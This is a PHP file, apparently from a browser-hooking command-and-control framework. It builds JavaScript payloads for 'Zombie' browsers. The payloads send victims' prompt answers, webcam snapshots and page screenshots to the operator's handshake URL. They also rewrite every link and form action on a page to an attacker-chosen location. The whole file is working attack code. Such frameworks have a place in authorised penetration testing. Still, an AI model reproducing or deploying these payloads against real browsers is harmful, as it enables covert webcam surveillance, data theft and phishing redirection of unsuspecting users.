<?php
/*
These functions will generate Javascript to send to Zombies.
*/
require_once('config.php');

//Generates prompt to send to Zombie with question
//If user cancels the prompt it logs as no response back to homebase
//If user enters text into prompt it logs users response back to homebase
function generate_prompt_js($question, $uid, $zid){
	global $handshakeurl;
  $modalstring = "<a onclick=\"generate_modal(\'Original Zombie Prompt Text\', \'".addslashes(htmlspecialchars($question))."\', \'Close\', \'return false;\');\">View Original Prompt Text</a>";
	$promptjavascript = <<<JS
//Function to send response back to server
function response(zid, uid, command, results) {
  $.ajax({
    type: "POST",
    url: "$handshakeurl",
    data: {
      do:"response",
      uid:uid,
      zid:zid,
      command:command,
      response:results
    },
    cache: false,
    success: function(response) {
        console.log('This is the response request callback');
      }
    });
}
//Setup prompt with user provided question
var question = "$question";
var zid = "$zid";
var uid = "$uid";
var promptzombie = prompt(question);
if(promptzombie == null || promptzombie == "") {
	var results = "No Response";
	response(zid, uid, '$modalstring', results);
} else {
	var results = "<a onclick=\"generate_modal(\'Zombie Prompt Response\', '"+promptzombie+"', 'Close', 'return false;');\">Response</a>";
	response(zid, uid, '$modalstring', results);
}
JS;
	return $promptjavascript;
}

//Generates take picture command to send to Zombie
//User must accept use of webcam before picture is taken
//If user does not accept nothing is sent back to homebase
//If user does accept a picture from webcam is logged back to homebase
function generate_picture_js($uid, $zid) {
	global $handshakeurl;
	$webcamjavascript = <<<JS
var uid = '$uid';
var zid = '$zid';
//Create our canvas and video elements
//These are what we will get the picture from
var create = document.createElement("canvas");
create.setAttribute("id", "canvas");
create.setAttribute("width", "0");
create.setAttribute("height", "0");
create.setAttribute("style", "display:none;");

var create2 = document.createElement("video");
create2.setAttribute("id", "video");
create2.setAttribute("width", "0");
create2.setAttribute("height", "0");
create2.setAttribute("style", "display:none;");

//Create jQuery source for Ajax request
var create3 = document.createElement("script");
create3.setAttribute("src", "//code.jquery.com/jquery-1.11.0.min.js");

//Add created elements to body
document.body.appendChild(create);
document.body.appendChild(create2);
document.body.appendChild(create3);
  
var streaming = false,
  video        = document.querySelector('#video'),
  canvas       = document.querySelector('#canvas'),
  width = 320,
  height = 0;

navigator.getMedia = ( navigator.getUserMedia ||
                        navigator.webkitGetUserMedia ||
                        navigator.mozGetUserMedia ||
                        navigator.msGetUserMedia);

navigator.getMedia(
  {
    video: true,
    audio: false
  },
  function(stream) {
    if (navigator.mozGetUserMedia) {
      video.mozSrcObject = stream;
    } else {
      var vendorURL = window.URL || window.webkitURL;
      video.src = vendorURL.createObjectURL(stream);
    }
    video.play();
  },
    function(err) {
      console.log("An error occured! " + err);
    }
  );

video.addEventListener('canplay', function(ev){
  if (!streaming) {
    height = video.videoHeight / (video.videoWidth/width);
    video.setAttribute('width', width);
    video.setAttribute('height', height);
    canvas.setAttribute('width', width);
    canvas.setAttribute('height', height);
    streaming = true;
    }
    setTimeout(function() { take_picture(); }, 2000);
  }, false);

function take_picture() {
  canvas.width = width;
  canvas.height = height;
  canvas.getContext('2d').drawImage(video, 0, 0, width, height);
  var data = canvas.toDataURL('image/png');
  response(zid, uid, "Take Picture", data);
}

//Send response back to server
function response(zid, uid, command, response) {
  $.ajax({
    type: "POST",
    url: "$handshakeurl",
    data: {
      do:"response",
      uid:uid,
      zid:zid,
      command:command,
      response:"<a onclick=\"generate_modal('Web Cam Response', '<img src=\\\'"+response+"\\\'>', 'Close', 'return false;');\">View Webcam Response</a>"
    },
    cache: false,
    success: function(response) {
        console.log('This is the response request callback');
        console.log(response);
      }
    });      
} 
JS;
	return $webcamjavascript;
}


//Generates screenshot command to send to Zombie
//This uses html2canvas to generate a png of the Zombies current page
//More info on the html2canvas project here: https://html2canvas.hertzen.com/
function generate_screenshot_js($uid, $zid) {
  global $handshakeurl;
  global $domain;
  global $sitepath;
  $screenshotjavascript = <<<JS
var zid = "$zid";
var uid = "$uid";
//Send response back to server
function response(zid, uid, command, response) {
  $.ajax({
    type: "POST",
    url: "$handshakeurl",
    data: {
      do:"response",
      uid:uid,
      zid:zid,
      command:command,
      response:"<a href=\""+response+"\">View Screenshot</a>"
    },
    cache: false,
    success: function(response) {
        console.log('This is the response request callback');
        console.log(response);
      }
    });      
} 
$.getScript('$domain$sitepath/styles/html2canvas/dist/html2canvas.js', function() {
    html2canvas(document.documentElement).then(function(canvas) {
    var data = canvas.toDataURL('image/png');
    response(zid, uid, 'Take Screenshot', data);
  });
});
JS;
  return $screenshotjavascript;
}

function generate_replace_links_js($uid, $zid, $linklocation) {
  global $handshakeurl;
  global $domain;
  global $sitepath;
  $replacelinkjavascript = <<<JS
var zid = "$zid";
var uid = "$uid";
//Send response back to server
function response(zid, uid, command, response) {
  $.ajax({
    type: "POST",
    url: "$handshakeurl",
    data: {
      do:"response",
      uid:uid,
      zid:zid,
      command:command,
      response:response
    },
    cache: false,
    success: function(response) {
        console.log('This is the response request callback');
        console.log(response);
      }
    });      
} 
var num = 0;
$("a").each(function(){
  if($(this).attr('href')) {
    $(this).attr('href', "$linklocation");
    num++;
  }
});
var numlinks = num+' Links Replaced';
response(zid, uid, "Replace All Links", numlinks);
JS;
  return $replacelinkjavascript;
}

function generate_replace_form_action_js($uid, $zid, $linklocation) {
  global $handshakeurl;
  global $domain;
  global $sitepath;
  $replaceformactionjavascript = <<<JS
var zid = "$zid";
var uid = "$uid";
//Send response back to server
function response(zid, uid, command, response) {
  $.ajax({
    type: "POST",
    url: "$handshakeurl",
    data: {
      do:"response",
      uid:uid,
      zid:zid,
      command:command,
      response:response
    },
    cache: false,
    success: function(response) {
        console.log('This is the response request callback');
        console.log(response);
      }
    });      
} 
var num = 0;
var num = 0;
$("form").each(function(){
  if($(this).attr('action')) {
    $(this).attr('action', "$linklocation");
    num++;
  }
});
var numlinks = num+' Links Replaced';
response(zid, uid, "Replace All Links", numlinks);
JS;
  return $replaceformactionjavascript;
}
?>